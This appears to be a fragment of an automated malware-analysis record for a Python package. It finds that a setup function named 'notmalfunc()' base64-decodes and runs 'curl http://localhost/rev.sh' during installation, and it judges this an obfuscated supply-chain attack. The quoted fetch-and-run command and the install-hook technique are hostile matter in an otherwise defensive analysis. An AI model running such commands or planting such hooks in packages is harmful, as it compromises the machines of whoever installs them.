  "purpose": "Detect and evaluate potential malicious behavior in the provided Python package setup code, focusing on obfuscation, remote code execution, and supply chain risks.",
  "sources": "The function 'notmalfunc()' which decodes a base64 string and executes it via os.system(), invoked during package installation.",
  "sinks": "os.system() call executing a decoded command, which runs 'curl http://localhost/rev.sh'.",
  "flows": "The base64 string is decoded in 'notmalfunc()', then passed directly to os.system() during the 'install' phase, executing the command.",
  "anomalies": "Use of base64 encoding to obfuscate a shell command that fetches a script from localhost; execution during package install; potential for remote code execution if URL is modified.",
  "analysis": "The code decodes a base64 string that results in 'curl http://localhost/rev.sh' and executes it during package installation, indicating malicious intent. The obfuscation via base64 is a common tactic to hide malicious commands. The execution during install poses a supply chain security risk. The URL points to localhost, which limits external risk but does not negate malicious pattern. The high scores assigned in the reports (0.75-1 for malware, 0.8-1 for security risk) are justified given the behavior. The pattern of remote code fetch and execution, combined with obfuscation, aligns with malicious activity. While localhost reduces immediate external threat, the overall pattern warrants high suspicion and caution.",
  "conclusion": "The code exhibits malicious behavior by executing an obfuscated remote command during package installation. The high malware and security risk scores are justified. The pattern suggests a supply chain attack vector, and the package should be treated as highly suspicious or malicious. The use of localhost URL may be a placeholder, but the obfuscation and execution pattern are indicative of malicious intent.",
